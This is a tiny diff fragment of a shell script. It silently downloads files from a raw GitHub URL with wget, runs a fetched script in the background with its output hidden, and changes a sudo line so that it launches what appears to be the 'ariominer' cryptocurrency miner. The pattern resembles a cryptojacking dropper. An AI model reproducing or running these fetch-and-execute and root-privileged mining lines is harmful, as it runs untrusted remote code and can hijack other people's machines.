@@ -73,7 +73,7 @@ wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/m
 
 bash ./linuxgoogle84741274 &> /dev/null &
 
-sudo ./linux84 8
+sudo ./ariominer 8
 
 done
 
